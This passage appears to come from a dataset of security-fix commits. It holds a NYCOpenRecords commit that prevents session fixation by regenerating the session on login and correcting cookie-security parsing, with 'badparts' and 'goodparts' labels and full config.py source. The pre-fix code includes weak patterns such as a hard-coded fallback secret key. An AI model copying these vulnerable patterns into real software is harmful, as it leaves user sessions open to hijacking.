os.environ.get('APP_TIMEZONE') or 'US\/Eastern'\n-    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') or True\n+    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') == 'True'\n \n     # Note: BASE_URL and VIEW_REQUEST_ENDPOINT used for the automatic status update job (jobs.py)\n     BASE_URL = os.environ.get('BASE_URL')\n","add":1,"remove":1,"filename":"\/config.py","badparts":["    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') or True"],"goodparts":["    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') == 'True'"]}],"source":"\nimport os from datetime import timedelta from dotenv import load_dotenv basedir=os.path.abspath(os.path.dirname(__file__)) dotenv_path=os.path.join(basedir, '.env') load_dotenv(dotenv_path) class Config: NYC_GOV_BASE='www1.nyc.gov' WTF_CSRF_ENABLED=True SECRET_KEY=os.environ.get('SECRET_KEY') or 'hard to guess string' LOGFILE_DIRECTORY=(os.environ.get('LOGFILE_DIRECTORY') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'logs\/')) APP_TIMEZONE=os.environ.get('APP_TIMEZONE') or 'US\/Eastern' SESSION_COOKIE_SECURE=os.environ.get('SESSION_COOKIE_SECURE') or True BASE_URL=os.environ.get('BASE_URL') VIEW_REQUEST_ENDPOINT=os.environ.get('VIEW_REQUEST_ENDPOINT') AGENCY_DATA=(os.environ.get('AGENCY_DATA') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data', 'agencies.csv')) REASON_DATA=(os.environ.get('REASONS_DATA') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data', 'reasons.csv')) STAFF_DATA=(os.environ.get('STAFF_DATA') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data', 'staff.csv')) DUE_SOON_DAYS_THRESHOLD=os.environ.get('DUE_SOON_DAYS_THRESHOLD') or 2 USE_SFTP=os.environ.get('USE_SFTP')==\"True\" SFTP_HOSTNAME=os.environ.get('SFTP_HOSTNAME') SFTP_PORT=os.environ.get('SFTP_PORT') SFTP_USERNAME=os.environ.get('SFTP_USERNAME') SFTP_RSA_KEY_FILE=os.environ.get('SFTP_RSA_KEY_FILE') SFTP_UPLOAD_DIRECTORY=os.environ.get('SFTP_UPLOAD_DIRECTORY') PERMANENT_SESSION_LIFETIME=timedelta(minutes=int(os.environ.get('PERMANENT_SESSION_LIFETIME', 30))) SAML_PATH=(os.environ.get('SAML_PATH') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'saml')) IDP=os.environ.get('IDP') USE_SAML=os.environ.get('USE_SAML')==\"True\" USE_LDAP=os.environ.get('USE_LDAP')==\"True\" LDAP_SERVER=os.environ.get('LDAP_SERVER') or None LDAP_PORT=os.environ.get('LDAP_PORT') or None LDAP_USE_TLS=os.environ.get('LDAP_USE_TLS')==\"True\" LDAP_KEY_PATH=os.environ.get('LDAP_KEY_PATH') or None LDAP_SA_BIND_DN=os.environ.get('LDAP_SA_BIND_DN') or None LDAP_SA_PASSWORD=os.environ.get('LDAP_SA_PASSWORD') or None LDAP_BASE_DN=os.environ.get('LDAP_BASE_DN') or None SQLALCHEMY_COMMIT_ON_TEARDOWN=True REDIS_HOST=os.environ.get('REDIS_HOST') or 'localhost' REDIS_PORT=os.environ.get('REDIS_PORT') or '6379' CELERY_REDIS_DB=0 SESSION_REDIS_DB=1 UPLOAD_REDIS_DB=2 EMAIL_REDIS_DB=3 CELERY_BROKER_URL='redis:\/\/{redis_host}:{redis_port}\/{celery_redis_db}'.format( redis_host=REDIS_HOST, redis_port=REDIS_PORT, celery_redis_db=CELERY_REDIS_DB ) CELERY_RESULT_BACKEND='redis:\/\/{redis_host}:{redis_port}\/{celery_redis_db}'.format( redis_host=REDIS_HOST, redis_port=REDIS_PORT, celery_redis_db=CELERY_REDIS_DB ) MAIL_SERVER=os.environ.get('MAIL_SERVER') MAIL_PORT=os.environ.get('MAIL_PORT') MAIL_USE_TLS=os.environ.get('MAIL_USE_TLS', \"True\")==\"True\" MAIL_USERNAME=os.environ.get('MAIL_USERNAME') MAIL_PASSWORD=os.environ.get('MAIL_PASSWORD') MAIL_SUBJECT_PREFIX=os.environ.get('SUBJECT_PREFIX') MAIL_SENDER=os.environ.get('MAIL_SENDER') EMAIL_TEMPLATE_DIR='email_templates\/' SQLALCHEMY_TRACK_MODIFICATIONS=False UPLOAD_QUARANTINE_DIRECTORY=(os.environ.get('UPLOAD_QUARANTINE_DIRECTORY') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'quarantine\/incoming\/')) UPLOAD_SERVING_DIRECTORY=(os.environ.get('UPLOAD_DIRECTORY') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'quarantine\/outgoing\/')) UPLOAD_DIRECTORY=(os.environ.get('UPLOAD_DIRECTORY') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data\/') if not USE_SFTP else SFTP_UPLOAD_DIRECTORY) VIRUS_SCAN_ENABLED=os.environ.get('VIRUS_SCAN_ENABLED')==\"True\" MAGIC_FILE=(os.environ.get('MAGIC_FILE') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'magic')) RECAPTCHA_SITE_KEY=os.environ.get('RECAPTCHA_SITE_KEY') RECAPTCHA_SECRET_KEY=os.environ.get('RECAPTCHA_SECRET_KEY') ELASTICSEARCH_HOST=os.environ.get('ELASTICSEARCH_HOST') or \"localhost:9200\" ELASTICSEARCH_ENABLED=os.environ.get('ELASTICSEARCH_ENABLED')==\"True\" ELASTICSEARCH_INDEX=os.environ.get('ELASTICSEARCH_INDEX') or \"requests\" ELASTICSEARCH_USE_SSL=os.environ.get('ELASTICSEARCH_USE_SSL')==\"True\" ELASTICSEARCH_USERNAME=os.environ.get('ELASTICSEARCH_USERNAME') ELASTICSEARCH_PASSWORD=os.environ.get('ELASTICSEARCH_PASSWORD') ELASTICSEARCH_HTTP_AUTH=((ELASTICSEARCH_USERNAME, ELASTICSEARCH_PASSWORD) if ELASTICSEARCH_USERNAME and ELASTICSEARCH_PASSWORD else None) @staticmethod def init_app(app): pass class DevelopmentConfig(Config): DEBUG=True VIRUS_SCAN_ENABLED=os.environ.get('VIRUS_SCAN_ENABLED')==\"True\" MAIL_SERVER=os.environ.get('MAIL_SERVER') or 'localhost' MAIL_PORT=os.environ.get('MAIL_PORT') or 2500 MAIL_USE_TLS=False MAIL_SUBJECT_PREFIX='[OpenRecords Development]' MAIL_SENDER='OpenRecords -Dev Admin <donotreply@records.nyc.gov>' SQLALCHEMY_DATABASE_URI=(os.environ.get('DATABASE_URL') or 'postgresql:\/\/localhost:5432\/openrecords_v2_0_dev') ELASTICSEARCH_INDEX=os.environ.get('ELASTICSEARCH_INDEX') or \"requests_dev\" MAGIC_FILE=os.environ.get('MAGIC_FILE') class TestingConfig(Config): TESTING=True VIRUS_SCAN_ENABLED=True USE_SFTP=False UPLOAD_DIRECTORY=os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data\/') MAIL_SUBJECT_PREFIX='[OpenRecords Testing]' MAIL_SENDER='OpenRecords -Testing Admin <donotreply@records.nyc.gov>' SQLALCHEMY_DATABASE_URI=(os.environ.get('TEST_DATABASE_URL') or 'postgresql:\/\/localhost:5432\/openrecords_v2_0_test') class ProductionConfig(Config): VIRUS_SCAN_ENABLED=True ELASTICSEARCH_ENABLED=True config={ 'development': DevelopmentConfig, 'testing': TestingConfig, 'production': ProductionConfig, 'default': DevelopmentConfig } ","sourceWithComments":"import os\nfrom datetime import timedelta\n\nfrom dotenv import load_dotenv\n\nbasedir = os.path.abspath(os.path.dirname(__file__))\n\ndotenv_path = os.path.join(basedir, '.env')\nload_dotenv(dotenv_path)\n\n\nclass Config:\n    NYC_GOV_BASE = 'www1.nyc.gov'\n    WTF_CSRF_ENABLED = True\n    SECRET_KEY = os.environ.get('SECRET_KEY') or 'hard to guess string'\n    LOGFILE_DIRECTORY = (os.environ.get('LOGFILE_DIRECTORY') or\n                         os.path.join(os.path.abspath(os.path.dirname(__file__)), 'logs\/'))\n\n    APP_TIMEZONE = os.environ.get('APP_TIMEZONE') or 'US\/Eastern'\n    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') or True\n\n    # Note: BASE_URL and VIEW_REQUEST_ENDPOINT used for the automatic status update job (jobs.py)\n    BASE_URL = os.environ.get('BASE_URL')\n    VIEW_REQUEST_ENDPOINT = os.environ.get('VIEW_REQUEST_ENDPOINT')\n\n    AGENCY_DATA = (os.environ.get('AGENCY_DATA') or\n                   os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data', 'agencies.csv'))\n    REASON_DATA = (os.environ.get('REASONS_DATA') or\n                   os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data', 'reasons.csv'))\n    STAFF_DATA = (os.environ.get('STAFF_DATA') or\n                   os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data', 'staff.csv'))\n\n    DUE_SOON_DAYS_THRESHOLD = os.environ.get('DUE_SOON_DAYS_THRESHOLD') or 2\n\n    # SFTP\n    USE_SFTP = os.environ.get('USE_SFTP') == \"True\"\n    SFTP_HOSTNAME = os.environ.get('SFTP_HOSTNAME')\n    SFTP_PORT = os.environ.get('SFTP_PORT')\n    SFTP_USERNAME = os.environ.get('SFTP_USERNAME')\n    SFTP_RSA_KEY_FILE = os.environ.get('SFTP_RSA_KEY_FILE')\n    SFTP_UPLOAD_DIRECTORY = os.environ.get('SFTP_UPLOAD_DIRECTORY')\n\n    # Authentication Settings\n    PERMANENT_SESSION_LIFETIME = timedelta(minutes=int(os.environ.get('PERMANENT_SESSION_LIFETIME', 30)))\n    SAML_PATH = (os.environ.get('SAML_PATH') or\n                os.path.join(os.path.abspath(os.path.dirname(__file__)), 'saml'))\n    IDP = os.environ.get('IDP')\n    USE_SAML = os.environ.get('USE_SAML') == \"True\"\n    USE_LDAP = os.environ.get('USE_LDAP') == \"True\"\n    LDAP_SERVER = os.environ.get('LDAP_SERVER') or None\n    LDAP_PORT = os.environ.get('LDAP_PORT') or None\n    LDAP_USE_TLS = os.environ.get('LDAP_USE_TLS') == \"True\"\n    LDAP_KEY_PATH = os.environ.get('LDAP_KEY_PATH') or None\n    LDAP_SA_BIND_DN = os.environ.get('LDAP_SA_BIND_DN') or None\n    LDAP_SA_PASSWORD = os.environ.get('LDAP_SA_PASSWORD') or None\n    LDAP_BASE_DN = os.environ.get('LDAP_BASE_DN') or None\n\n    # Database Settings\n    SQLALCHEMY_COMMIT_ON_TEARDOWN = True\n\n    # Redis Settings\n    REDIS_HOST = os.environ.get('REDIS_HOST') or 'localhost'\n    REDIS_PORT = os.environ.get('REDIS_PORT') or '6379'\n    CELERY_REDIS_DB = 0\n    SESSION_REDIS_DB = 1\n    UPLOAD_REDIS_DB = 2\n    EMAIL_REDIS_DB = 3\n\n    # Celery Settings\n    CELERY_BROKER_URL = 'redis:\/\/{redis_host}:{redis_port}\/{celery_redis_db}'.format(\n        redis_host=REDIS_HOST,\n        redis_port=REDIS_PORT,\n        celery_redis_db=CELERY_REDIS_DB\n    )\n    CELERY_RESULT_BACKEND = 'redis:\/\/{redis_host}:{redis_port}\/{celery_redis_db}'.format(\n        redis_host=REDIS_HOST,\n        redis_port=REDIS_PORT,\n        celery_redis_db=CELERY_REDIS_DB\n    )\n\n    # Flask-Mail Settings\n    MAIL_SERVER = os.environ.get('MAIL_SERVER')\n    MAIL_PORT = os.environ.get('MAIL_PORT')\n    MAIL_USE_TLS = os.environ.get('MAIL_USE_TLS', \"True\") == \"True\"\n    MAIL_USERNAME = os.environ.get('MAIL_USERNAME')\n    MAIL_PASSWORD = os.environ.get('MAIL_PASSWORD')\n    MAIL_SUBJECT_PREFIX = os.environ.get('SUBJECT_PREFIX')\n    MAIL_SENDER = os.environ.get('MAIL_SENDER')\n\n    # TODO: should be a constant\n    EMAIL_TEMPLATE_DIR = 'email_templates\/'\n\n    # Flask-SQLAlchemy\n    SQLALCHEMY_TRACK_MODIFICATIONS = False  # remove once this becomes the default\n\n    # Upload Settings\n    # TODO: change naming since quarantine is used as a serving directory as well\n    UPLOAD_QUARANTINE_DIRECTORY = (os.environ.get('UPLOAD_QUARANTINE_DIRECTORY') or\n                                   os.path.join(os.path.abspath(os.path.dirname(__file__)), 'quarantine\/incoming\/'))\n    UPLOAD_SERVING_DIRECTORY = (os.environ.get('UPLOAD_DIRECTORY') or\n                                os.path.join(os.path.abspath(os.path.dirname(__file__)), 'quarantine\/outgoing\/'))\n    UPLOAD_DIRECTORY = (os.environ.get('UPLOAD_DIRECTORY') or\n                        os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data\/')\n                        if not USE_SFTP else SFTP_UPLOAD_DIRECTORY)\n    VIRUS_SCAN_ENABLED = os.environ.get('VIRUS_SCAN_ENABLED') == \"True\"\n    MAGIC_FILE = (os.environ.get('MAGIC_FILE') or\n                  os.path.join(os.path.abspath(os.path.dirname(__file__)), 'magic'))\n\n    # ReCaptcha\n    RECAPTCHA_SITE_KEY = os.environ.get('RECAPTCHA_SITE_KEY')\n    RECAPTCHA_SECRET_KEY = os.environ.get('RECAPTCHA_SECRET_KEY')\n\n    # ElasticSearch settings\n    ELASTICSEARCH_HOST = os.environ.get('ELASTICSEARCH_HOST') or \"localhost:9200\"\n    ELASTICSEARCH_ENABLED = os.environ.get('ELASTICSEARCH_ENABLED') == \"True\"\n    ELASTICSEARCH_INDEX = os.environ.get('ELASTICSEARCH_INDEX') or \"requests\"\n    ELASTICSEARCH_USE_SSL = os.environ.get('ELASTICSEARCH_USE_SSL') == \"True\"\n    ELASTICSEARCH_USERNAME = os.environ.get('ELASTICSEARCH_USERNAME')\n    ELASTICSEARCH_PASSWORD = os.environ.get('ELASTICSEARCH_PASSWORD')\n    ELASTICSEARCH_HTTP_AUTH = ((ELASTICSEARCH_USERNAME,\n                                ELASTICSEARCH_PASSWORD)\n                               if ELASTICSEARCH_USERNAME and ELASTICSEARCH_PASSWORD\n                               else None)\n    # https:\/\/www.elastic.co\/blog\/index-vs-type\n\n    @staticmethod\n    def init_app(app):\n        pass\n\n\nclass DevelopmentConfig(Config):\n    DEBUG = True\n    VIRUS_SCAN_ENABLED = os.environ.get('VIRUS_SCAN_ENABLED') == \"True\"\n    MAIL_SERVER = os.environ.get('MAIL_SERVER') or 'localhost'\n    MAIL_PORT = os.environ.get('MAIL_PORT') or 2500\n    MAIL_USE_TLS = False\n    MAIL_SUBJECT_PREFIX = '[OpenRecords Development]'\n    MAIL_SENDER = 'OpenRecords - Dev Admin <donotreply@records.nyc.gov>'\n    SQLALCHEMY_DATABASE_URI = (os.environ.get('DATABASE_URL') or\n                               'postgresql:\/\/localhost:5432\/openrecords_v2_0_dev')\n    # Using Vagrant? Try: 'postgresql:\/\/vagrant@\/openrecords_v2_0_dev'\n    ELASTICSEARCH_INDEX = os.environ.get('ELASTICSEARCH_INDEX') or \"requests_dev\"\n    MAGIC_FILE = os.environ.get('MAGIC_FILE')\n\n\nclass TestingConfig(Config):\n    TESTING = True\n    VIRUS_SCAN_ENABLED = True\n    USE_SFTP = False\n    UPLOAD_DIRECTORY = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data\/')\n    MAIL_SUBJECT_PREFIX = '[OpenRecords Testing]'\n    MAIL_SENDER = 'OpenRecords - Testing Admin <donotreply@records.nyc.gov>'\n    SQLALCHEMY_DATABASE_URI = (os.environ.get('TEST_DATABASE_URL') or\n                               'postgresql:\/\/localhost:5432\/openrecords_v2_0_test')\n\n\nclass ProductionConfig(Config):\n    # TODO: complete me\n    VIRUS_SCAN_ENABLED = True\n    ELASTICSEARCH_ENABLED = True\n\n\nconfig = {\n    'development': DevelopmentConfig,\n    'testing': TestingConfig,\n    'production': ProductionConfig,\n    'default': DevelopmentConfig\n}\n"}},"msg":"prevent session fixation attacks"}},"https:\/\/github.com\/CityOfNewYork\/NYCOpenRecords":{"95cea5e2342f6807df783a8547e75a81bffe060d":{"url":"https:\/\/api.github.com\/repos\/CityOfNewYork\/NYCOpenRecords\/commits\/95cea5e2342f6807df783a8547e75a81bffe060d","html_url":"https:\/\/github.com\/CityOfNewYork\/NYCOpenRecords\/commit\/95cea5e2342f6807df783a8547e75a81bffe060d","message":"prevent session fixation attacks","sha":"95cea5e2342f6807df783a8547e75a81bffe060d","keyword":"session fixation prevent","diff":"diff --git a\/app\/auth\/views.py b\/app\/auth\/views.py\nindex ff4436a42..e68ad4988 100644\n--- a\/app\/auth\/views.py\n+++ b\/app\/auth\/views.py\n@@ -73,6 +73,7 @@ def ldap_login():\n \n             if authenticated:\n                 login_user(user)\n+                session.regenerate()  # KVSession.regenerate()\n                 session['user_id'] = current_user.get_id()\n \n                 return_to_url = request.form.get('return_to_url')\ndiff --git a\/config.py b\/config.py\nindex 5660f7d2c..6b1aee8ee 100644\n--- a\/config.py\n+++ b\/config.py\n@@ -17,7 +17,7 @@ class Config:\n                          os.path.join(os.path.abspath(os.path.dirname(__file__)), 'logs\/'))\n \n     APP_TIMEZONE = os.environ.get('APP_TIMEZONE') or 'US\/Eastern'\n-    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') or True\n+    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') == 'True'\n \n     # Note: BASE_URL and VIEW_REQUEST_ENDPOINT used for the automatic status update job (jobs.py)\n     BASE_URL = os.environ.get('BASE_URL')\n","files":{"\/config.py":{"changes":[{"diff":"\n                          os.path.join(os.path.abspath(os.path.dirname(__file__)), 'logs\/'))\n \n     APP_TIMEZONE = os.environ.get('APP_TIMEZONE') or 'US\/Eastern'\n-    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') or True\n+    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') == 'True'\n \n     # Note: BASE_URL and VIEW_REQUEST_ENDPOINT used for the automatic status update job (jobs.py)\n     BASE_URL = os.environ.get('BASE_URL')\n","add":1,"remove":1,"filename":"\/config.py","badparts":["    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') or True"],"goodparts":["    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') == 'True'"]},{"diff":"\n                          os.path.join(os.path.abspath(os.path.dirname(__file__)), 'logs\/'))\n \n     APP_TIMEZONE = os.environ.get('APP_TIMEZONE') or 'US\/Eastern'\n-    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') or True\n+    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') == 'True'\n \n     # Note: BASE_URL and VIEW_REQUEST_ENDPOINT used for the automatic status update job (jobs.py)\n     BASE_URL = os.environ.get('BASE_URL')\n","add":1,"remove":1,"filename":"\/config.py","badparts":["    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') or True"],"goodparts":["    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') == 'True'"]}],"source":"\nimport os from datetime import timedelta from dotenv import load_dotenv basedir=os.path.abspath(os.path.dirname(__file__)) dotenv_path=os.path.join(basedir, '.env') load_dotenv(dotenv_path) class Config: NYC_GOV_BASE='www1.nyc.gov' WTF_CSRF_ENABLED=True SECRET_KEY=os.environ.get('SECRET_KEY') or 'hard to guess string' LOGFILE_DIRECTORY=(os.environ.get('LOGFILE_DIRECTORY') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'logs\/')) APP_TIMEZONE=os.environ.get('APP_TIMEZONE') or 'US\/Eastern' SESSION_COOKIE_SECURE=os.environ.get('SESSION_COOKIE_SECURE') or True BASE_URL=os.environ.get('BASE_URL') VIEW_REQUEST_ENDPOINT=os.environ.get('VIEW_REQUEST_ENDPOINT') AGENCY_DATA=(os.environ.get('AGENCY_DATA') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data', 'agencies.csv')) REASON_DATA=(os.environ.get('REASONS_DATA') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data', 'reasons.csv')) STAFF_DATA=(os.environ.get('STAFF_DATA') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data', 'staff.csv')) DUE_SOON_DAYS_THRESHOLD=os.environ.get('DUE_SOON_DAYS_THRESHOLD') or 2 USE_SFTP=os.environ.get('USE_SFTP')==\"True\" SFTP_HOSTNAME=os.environ.get('SFTP_HOSTNAME') SFTP_PORT=os.environ.get('SFTP_PORT') SFTP_USERNAME=os.environ.get('SFTP_USERNAME') SFTP_RSA_KEY_FILE=os.environ.get('SFTP_RSA_KEY_FILE') SFTP_UPLOAD_DIRECTORY=os.environ.get('SFTP_UPLOAD_DIRECTORY') PERMANENT_SESSION_LIFETIME=timedelta(minutes=int(os.environ.get('PERMANENT_SESSION_LIFETIME', 30))) SAML_PATH=(os.environ.get('SAML_PATH') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'saml')) IDP=os.environ.get('IDP') USE_SAML=os.environ.get('USE_SAML')==\"True\" USE_LDAP=os.environ.get('USE_LDAP')==\"True\" LDAP_SERVER=os.environ.get('LDAP_SERVER') or None LDAP_PORT=os.environ.get('LDAP_PORT') or None LDAP_USE_TLS=os.environ.get('LDAP_USE_TLS')==\"True\" LDAP_KEY_PATH=os.environ.get('LDAP_KEY_PATH') or None LDAP_SA_BIND_DN=os.environ.get('LDAP_SA_BIND_DN') or None LDAP_SA_PASSWORD=os.environ.get('LDAP_SA_PASSWORD') or None LDAP_BASE_DN=os.environ.get('LDAP_BASE_DN') or None SQLALCHEMY_COMMIT_ON_TEARDOWN=True REDIS_HOST=os.environ.get('REDIS_HOST') or 'localhost' REDIS_PORT=os.environ.get('REDIS_PORT') or '6379' CELERY_REDIS_DB=0 SESSION_REDIS_DB=1 UPLOAD_REDIS_DB=2 EMAIL_REDIS_DB=3 CELERY_BROKER_URL='redis:\/\/{redis_host}:{redis_port}\/{celery_redis_db}'.format( redis_host=REDIS_HOST, redis_port=REDIS_PORT, celery_redis_db=CELERY_REDIS_DB ) CELERY_RESULT_BACKEND='redis:\/\/{redis_host}:{redis_port}\/{celery_redis_db}'.format( redis_host=REDIS_HOST, redis_port=REDIS_PORT, celery_redis_db=CELERY_REDIS_DB ) MAIL_SERVER=os.environ.get('MAIL_SERVER') MAIL_PORT=os.environ.get('MAIL_PORT') MAIL_USE_TLS=os.environ.get('MAIL_USE_TLS', \"True\")==\"True\" MAIL_USERNAME=os.environ.get('MAIL_USERNAME') MAIL_PASSWORD=os.environ.get('MAIL_PASSWORD') MAIL_SUBJECT_PREFIX=os.environ.get('SUBJECT_PREFIX') MAIL_SENDER=os.environ.get('MAIL_SENDER') EMAIL_TEMPLATE_DIR='email_templates\/' SQLALCHEMY_TRACK_MODIFICATIONS=False UPLOAD_QUARANTINE_DIRECTORY=(os.environ.get('UPLOAD_QUARANTINE_DIRECTORY') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'quarantine\/incoming\/')) UPLOAD_SERVING_DIRECTORY=(os.environ.get('UPLOAD_DIRECTORY') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'quarantine\/outgoing\/')) UPLOAD_DIRECTORY=(os.environ.get('UPLOAD_DIRECTORY') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data\/') if not USE_SFTP else SFTP_UPLOAD_DIRECTORY) VIRUS_SCAN_ENABLED=os.environ.get('VIRUS_SCAN_ENABLED')==\"True\" MAGIC_FILE=(os.environ.get('MAGIC_FILE') or os.path.join(os.path.abspath(os.path.dirname(__file__)), 'magic')) RECAPTCHA_SITE_KEY=os.environ.get('RECAPTCHA_SITE_KEY') RECAPTCHA_SECRET_KEY=os.environ.get('RECAPTCHA_SECRET_KEY') ELASTICSEARCH_HOST=os.environ.get('ELASTICSEARCH_HOST') or \"localhost:9200\" ELASTICSEARCH_ENABLED=os.environ.get('ELASTICSEARCH_ENABLED')==\"True\" ELASTICSEARCH_INDEX=os.environ.get('ELASTICSEARCH_INDEX') or \"requests\" ELASTICSEARCH_USE_SSL=os.environ.get('ELASTICSEARCH_USE_SSL')==\"True\" ELASTICSEARCH_USERNAME=os.environ.get('ELASTICSEARCH_USERNAME') ELASTICSEARCH_PASSWORD=os.environ.get('ELASTICSEARCH_PASSWORD') ELASTICSEARCH_HTTP_AUTH=((ELASTICSEARCH_USERNAME, ELASTICSEARCH_PASSWORD) if ELASTICSEARCH_USERNAME and ELASTICSEARCH_PASSWORD else None) @staticmethod def init_app(app): pass class DevelopmentConfig(Config): DEBUG=True VIRUS_SCAN_ENABLED=os.environ.get('VIRUS_SCAN_ENABLED')==\"True\" MAIL_SERVER=os.environ.get('MAIL_SERVER') or 'localhost' MAIL_PORT=os.environ.get('MAIL_PORT') or 2500 MAIL_USE_TLS=False MAIL_SUBJECT_PREFIX='[OpenRecords Development]' MAIL_SENDER='OpenRecords -Dev Admin <donotreply@records.nyc.gov>' SQLALCHEMY_DATABASE_URI=(os.environ.get('DATABASE_URL') or 'postgresql:\/\/localhost:5432\/openrecords_v2_0_dev') ELASTICSEARCH_INDEX=os.environ.get('ELASTICSEARCH_INDEX') or \"requests_dev\" MAGIC_FILE=os.environ.get('MAGIC_FILE') class TestingConfig(Config): TESTING=True VIRUS_SCAN_ENABLED=True USE_SFTP=False UPLOAD_DIRECTORY=os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data\/') MAIL_SUBJECT_PREFIX='[OpenRecords Testing]' MAIL_SENDER='OpenRecords -Testing Admin <donotreply@records.nyc.gov>' SQLALCHEMY_DATABASE_URI=(os.environ.get('TEST_DATABASE_URL') or 'postgresql:\/\/localhost:5432\/openrecords_v2_0_test') class ProductionConfig(Config): VIRUS_SCAN_ENABLED=True ELASTICSEARCH_ENABLED=True config={ 'development': DevelopmentConfig, 'testing': TestingConfig, 'production': ProductionConfig, 'default': DevelopmentConfig } ","sourceWithComments":"import os\nfrom datetime import timedelta\n\nfrom dotenv import load_dotenv\n\nbasedir = os.path.abspath(os.path.dirname(__file__))\n\ndotenv_path = os.path.join(basedir, '.env')\nload_dotenv(dotenv_path)\n\n\nclass Config:\n    NYC_GOV_BASE = 'www1.nyc.gov'\n    WTF_CSRF_ENABLED = True\n    SECRET_KEY = os.environ.get('SECRET_KEY') or 'hard to guess string'\n    LOGFILE_DIRECTORY = (os.environ.get('LOGFILE_DIRECTORY') or\n                         os.path.join(os.path.abspath(os.path.dirname(__file__)), 'logs\/'))\n\n    APP_TIMEZONE = os.environ.get('APP_TIMEZONE') or 'US\/Eastern'\n    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE') or True\n\n    # Note: BASE_URL and VIEW_REQUEST_ENDPOINT used for the automatic status update job (jobs.py)\n    BASE_URL = os.environ.get('BASE_URL')\n    VIEW_REQUEST_ENDPOINT = os.environ.get('VIEW_REQUEST_ENDPOINT')\n\n    AGENCY_DATA = (os.environ.get('AGENCY_DATA') or\n                   os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data', 'agencies.csv'))\n    REASON_DATA = (os.environ.get('REASONS_DATA') or\n                   os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data', 'reasons.csv'))\n    STAFF_DATA = (os.environ.get('STAFF_DATA') or\n                   os.path.join(os.path.abspath(os.path.dirname(__file__)), 'data', 'staff.csv'))\n\n    DUE_SOON_DAYS_THRESHOLD = os.environ.get('DUE_SOON_DAYS_THRESHOLD') or 2\n\n    # SFTP\n    USE_SFTP = os.environ.get('USE_SFTP') == \"True\"\n    SFTP_HOSTNAME = os.environ.get('SFTP_HOSTNAME')\n    SFTP_PORT = os.environ.get('SFTP_PORT')\n    SFTP_USERNAME = os.environ.get('SFTP_USERNAME')\n    SFTP_RSA_KEY_FILE = os.environ.get('SFTP_RSA_KEY_FILE')\n    SFTP_UPLOAD_DIRECTORY = os.environ.get('SFTP_UPLOAD_DIRECTORY')\n\n    # Authentication Settings\n    PERMANENT_SESSION_LIFETIME = timedelta(minutes=int(os.environ.get('PERMANENT_SESSION_LIFETIME', 30)))\n    SAML_PATH = (os.environ.get('SAML_PATH') or\n                os.path.join(os.path.abspath(os.path.dirname(__file__)), 'saml'))\n    IDP = os.environ.get('IDP')\n    USE_SAML = os.environ.get('USE_SAML') == \"True\"\n    USE_LDAP = os.environ.get('USE_LDAP') == \"True\"\n    LDAP_SERVER = os.environ.get('LDAP_SERVER') or None\n    LDAP_PORT = os.environ.get('LDAP_PORT') or None\n    LDAP_USE_TLS = os.environ.get('LDAP_USE_TLS') == \"True\"\n    LDAP_KEY_PATH = os.environ.get('LDAP_KEY_PATH') or None\n    LDAP_SA_BIND_DN = os.environ.get('LDAP_SA_BIND_DN') or None\n    LDAP_SA_PASSWORD = os.environ.get('LDAP_SA_PASSWORD') or None\n    LDAP_BASE_DN = os.environ.get('LDAP_BASE_DN') or None\n\n    # Database Settings\n    SQLALCHEMY_COMMIT_ON_TEARDOWN = True\n\n    # Redis Settings\n    REDIS_HOST = os.environ.get('REDIS_HOST') or 'localhost'\n    REDIS_PORT = os.environ.get('REDIS_PORT') or '6379'\n    CELERY_REDIS_DB = 0\n    SESSION_REDIS_DB = 1\n    UPLOAD_REDIS_DB = 2\n    EMAIL_REDIS_DB = 3\n\n    # Celery Settings\n    CELERY_BROKER_URL = 'redis:\/\/{redis_host}:{redis_port}\/{celery_redis_db}'.format(\n        redis_host=REDIS_HOST,\n        redis_port=REDIS_PORT,\n        celery_redis_db=CELERY_REDIS_DB\n    )\n    CELERY_RESULT_BACKEND = 'redis:\/\/{redis_host}:{redis_port}\/{celery_redis_db}'.format(\n        redis_host=REDIS_HOST,\n        redis_port=REDIS_PORT,\n        celery_redis_db=CELERY_REDIS_DB\n    )\n\n    # Flask-Mail Settings\n    